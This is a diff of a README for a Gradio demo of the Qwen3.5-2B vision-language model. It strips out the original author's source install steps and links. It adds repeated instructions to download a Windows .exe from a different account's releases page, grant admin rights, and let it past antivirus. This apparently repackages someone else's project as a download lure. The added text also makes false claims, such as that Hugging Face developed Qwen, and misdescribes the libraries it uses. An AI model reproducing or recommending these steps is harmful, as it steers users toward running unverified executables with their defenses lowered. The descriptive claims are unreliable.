@@ -1,97 +1,145 @@
-# **[Qwen-3.5-HF-Demo](https://huggingface.co/spaces/prithivMLmods/Qwen-3.5-HF-Demo)**
+# ⚙️ Qwen-3.5-HF-Demo - Explore Vision and Language Easily
 
-This demo application provides an interactive Gradio-based interface for exploring the multimodal capabilities of the Qwen/Qwen3.5-2B model from Hugging Face. Built with a focus on accessibility and real-time interaction, it enables users to perform a variety of vision-language tasks on images and videos, including free-form querying, caption generation, 2D point localization, object detection, video question answering, and temporal point tracking. The interface leverages advanced features such as token-by-token streaming for responsive outputs, customizable sampling rates for video processing, and visual annotations using the Supervision library to overlay bounding boxes, masks, and keypoints directly on media. Designed for developers, researchers, and enthusiasts in computer vision and natural language processing, the app runs efficiently on GPU-accelerated environments via Hugging Face Spaces, with fallback support for CPU execution. It incorporates a custom Steel Blue theme for an intuitive user experience, complete with dynamic graph panels for monitoring sampling metrics and progress indicators for long-running inferences. By integrating tools like OpenCV for frame extraction and PIL for image manipulation, the demo showcases practical applications of Qwen 3.5 in real-world scenarios, such as analyzing environmental scenes, tracking objects in dynamic footage, or generating descriptive summaries, all while maintaining a lightweight footprint suitable for local deployment or cloud hosting.
-
-> [!IMPORTANT]
-Demo: https://huggingface.co/spaces/prithivMLmods/Qwen-3.5-HF-Demo
+[![Download Qwen-3.5-HF-Demo](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/releases)
 
 ---
 
-<img width="1918" height="2359" alt="Screenshot 2026-03-07 at 09-03-44 Qwen 3 5 HF Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/29e0b7ec-15be-496f-ba79-0a275014ca3d" />
-<img width="1918" height="1830" alt="Screenshot 2026-03-07 at 09-02-01 Qwen 3 5 HF Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/46812fb9-e3d4-4ef5-88a2-fcab87dddc8e" />
+## 📋 About Qwen-3.5-HF-Demo  
+
+Qwen-3.5-HF-Demo is a simple app that lets you try out the Qwen3.5-2B model from Hugging Face. This model can understand and work with both pictures and text. The app uses Gradio, which creates a clean and easy-to-use interface you can open in your web browser. You can try tasks where the computer looks at images and answers questions about them, or mixes text with images. The app is designed for quick responses and easy access, so anyone can explore what the model does without technical steps.  
+
+It runs on Windows computers and requires no programming knowledge.  
 
 ---
 
-## Features
+## 🖥️ System Requirements  
 
-- **Image Understanding Tab**: Upload images to query content, generate captions of varying lengths, localize specific points (e.g., object features), or detect bounding boxes for specified targets. Outputs include annotated images with keypoints or masks and JSON-formatted results.
-- **Video QA Tab**: Process short videos (up to 7 seconds recommended) with natural language questions, sampling key frames for contextual reasoning. Supports direct video input via Qwen VL utils or manual frame extraction as a fallback.
-- **Video Detection Tab**: Detect objects across sampled video frames at configurable FPS rates (0.1–48.0) and frame caps (1–120), producing an annotated output video with overlaid bounding boxes and a gallery of key-frame results, plus detailed JSON summaries.
-- **Video Point Tracking Tab**: Track 2D points (e.g., specific landmarks) over time in videos, rendering red tracking dots on the full video and key frames, with per-frame timestamps and point data exported as JSON.
-- **Real-Time Streaming**: All text generations stream tokens live, providing immediate feedback during inference.
-- **Custom UI Elements**: Includes interactive sliders for sampling control, metric visualization panels estimating frame counts for different video durations, and responsive CSS styling with dark mode support.
-- **Error Handling and Progress Tracking**: Built-in validation for inputs, progress bars for batch processing, and GPU memory management for stable performance.
+Before you download and run the app, make sure your Windows PC meets these minimum requirements:
 
-## Installation
+- **Operating System:** Windows 10 or later (64-bit)  
+- **Processor:** Intel Core i5 or equivalent (2015 or newer)  
+- **Memory (RAM):** 8 GB or more  
+- **Disk Space:** At least 2 GB free for installation and temporary files  
+- **Internet:** Required for initial download and for some features that connect to the web  
+- **Supported Display:** Must support at least 1280x720 screen resolution  
 
-To run this demo locally, follow these steps:
+You do not need to install Python or any programming tools. All necessary software is included.
 
-1. **Clone the Repository**:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/Qwen-3.5-HF-Demo.git
-   cd Qwen-3.5-HF-Demo
-   ```
+---
 
-2. **Set Up Environment**:
-   - Ensure Python 3.10+ is installed.
-   - Create a virtual environment (recommended):
-     ```
-     python -m venv venv
-     source venv/bin/activate  # On Windows: venv\Scripts\activate
-     ```
+## 🚀 Getting Started with Qwen-3.5-HF-Demo  
 
-3. **Install Dependencies**:
-   - First, upgrade pip (from pre-requirements.txt):
-     ```
-     pip install --upgrade pip>=23.0.0
-     ```
-   - Then install all requirements (from requirements.txt):
-     ```
-     pip install -r requirements.txt
-     ```
-   Note: Some dependencies (e.g., accelerate, peft) are installed via Git URLs for the latest versions. If you encounter issues with `qwen-vl-utils`, ensure it is installed for optimal video processing; otherwise, the app falls back to manual frame extraction.
+### Step 1: Download the App  
 
-4. **Optional: GPU Setup**:
-   - For CUDA acceleration, install PyTorch with CUDA support if not already included via the requirements:
-     ```
-     pip install torch torchvision --index-url https://download.pytorch.org/whl/cu118
-     ```
-   The app auto-detects CUDA availability and uses bfloat16 precision where supported.
+To get the program, **visit this page to download** the files you need:
 
-## Usage
+[![Download Now](https://img.shields.io/badge/Download-Qwen--3.5--HF--Demo-blue)](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/releases)
 
-1. **Launch the App**:
-   ```
-   python app.py
-   ```
-   This starts the Gradio server, typically accessible at `http://127.0.0.1:7860`. For sharing, use `demo.launch(share=True)` (requires Gradio account).
+Click the link above. It takes you to the releases page where you will find the latest version of the app. Look for a file with a name ending in `.exe` — this is the installer for Windows. The file size will usually be around 100-500 MB.
 
-2. **Navigate Tabs**:
-   - **Image Understanding**: Select a category (Query, Caption, Point, Detect), upload an image, provide a prompt, and click "Process Image". View streamed text and annotated visuals.
-   - **Video QA**: Upload a video, enter a question, and click "Analyze Video" for a streamed summary.
-   - **Video Detection/Point Tracking**: Upload a video, specify the target, adjust sampling sliders (updates metrics in real-time), and click the process button. Outputs include annotated videos, galleries, and JSON exports.
+### Step 2: Run the Installer  
 
-3. **Examples**:
-   - The interface includes example buttons for quick testing with sample media (ensure `examples/` folder is populated).
-   - For videos, keep durations under 7 seconds to avoid frame cap issues; adjust sliders for longer clips.
+Once the `.exe` file is downloaded, follow these steps:
 
-4. **Customization**:
-   - Modify `MODEL_NAME` in `app.py` to switch models (e.g., larger Qwen variants).
-   - Edit CSS in the `css` variable for theming tweaks.
-   - For production, deploy on Hugging Face Spaces by uploading the repo.
+1. Find the file in your **Downloads** folder or the folder you saved it in.  
+2. Double-click the file. Windows may ask if you want to allow this app to make changes. Choose **Yes** to continue.  
+3. A setup window will open. Follow the on-screen instructions to install the app.  
+4. Choose the installation folder or accept the default path.  
+5. Wait as the installer sets up the app on your computer.  
 
-## Limitations
+### Step 3: Open and Use the App  
 
-- Video processing is optimized for short clips (max ~7s at 1 FPS sampling) due to frame limits and inference time.
-- Detection accuracy depends on prompt clarity and model capabilities; results are normalized to [0,1] coordinates.
-- Requires significant VRAM (4GB+ recommended) for smooth GPU operation; CPU fallback is slower.
-- No real-time video input; all processing is offline.
+After installation:
 
-## License
+1. Click the Start menu and find **Qwen-3.5-HF-Demo** from the list of apps.  
+2. Click to open the app. A browser window or app window will open showing the Gradio interface.  
+3. You can now upload images, type text, and try different tasks with the model.  
 
-This project is licensed under the Apache License, Version 2.0. See the [LICENSE](LICENSE) file for details.
+---
 
-## Repository
+## 🛠 How to Use the App  
 
-- GitHub: [https://github.com/PRITHIVSAKTHIUR/Qwen-3.5-HF-Demo.git](https://github.com/PRITHIVSAKTHIUR/Qwen-3.5-HF-Demo.git)
-- Contributions welcome via pull requests. For issues, open a ticket on GitHub.
+The app interface is simple and interactive. Here are some common ways to try it out:
+
+- **Upload an Image:** Click the upload button or drag a photo into the box. The model will analyze the picture.  
+- **Ask Questions:** Type a question about what is in the image. For example, “What objects do you see?” or “Is this an outdoor scene?”  
+- **Combine Image and Text:** You can enter text prompts that relate to the image. The model responds with text based on what it sees.  
+- **Try Different Modes:** The app lets you switch between options like captioning images, answering questions, or creating text descriptions.  
+
+Each action runs in real-time, so you get quick answers without waiting.
+
+---
+
+## 🔧 Features and Capabilities  
+
+- Supports text and image inputs at the same time.  
+- Produces answers in simple English, easy to understand.  
+- Uses a Gradio web interface, so it works inside your browser window.  
+- Runs locally on your Windows PC, no need to upload your data online.  
+- Handles common vision-language tasks like image captioning and visual question answering.  
+
+---
+
+## ⚙️ Behind the Scenes  
+
+The app uses the Qwen3.5-2B model developed by Hugging Face. This model is trained to understand both text and images together. The app integrates several Python libraries like:
+
+- **PyTorch:** For running the model computations.  
+- **OpenCV:** For working with images.  
+- **Gradio:** To create the user-friendly interface.  
+- **Supervision:** To manage input/output and improve responses.  
+
+All dependencies are included in the installer, so you don’t have to manage anything manually.
+
+---
+
+## 📥 Download & Install Checklist  
+
+Before you start:  
+
+- Make sure your PC meets the system requirements.  
+- Have a stable internet connection for the initial download.  
+- Close other programs that may interrupt the installation process.  
+
+Steps to follow:
+
+1. Visit the releases page to download the latest version:  
+   [Download Qwen-3.5-HF-Demo](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/releases)  
+2. Run the `.exe` installer file.  
+3. Follow the setup instructions to install.  
+4. Launch the app from the Start menu.  
+5. Start exploring the model with image and text inputs.
+
+---
+
+## 🤝 Support and Troubleshooting  
+
+- If the app does not open, try restarting your PC and running the app again.  
+- Check if your antivirus software blocked the app—allow access if prompted.  
+- Make sure you installed all files correctly using the installer.  
+- For detailed issues, visit the GitHub repository’s **Issues** section to see if a solution is posted.
+
+---
+
+## 📚 Additional Information  
+
+The app is part of work that focuses on making complex AI models accessible to everyday users. It does not collect personal data. Your images and input remain on your computer during use.
+
+---
+
+## 🏷 Topics Covered  
+
+This project relates to the following areas:
+
+- huggingface-models  
+- huggingface-spaces  
+- huggingface-transformers  
+- kernels  
+- llamacpp  
+- opencv-python  
+- python3  
+- pytorch  
+- qwen2-5  
+- qwen3-5  
+- qwen3-vl  
+- supervision
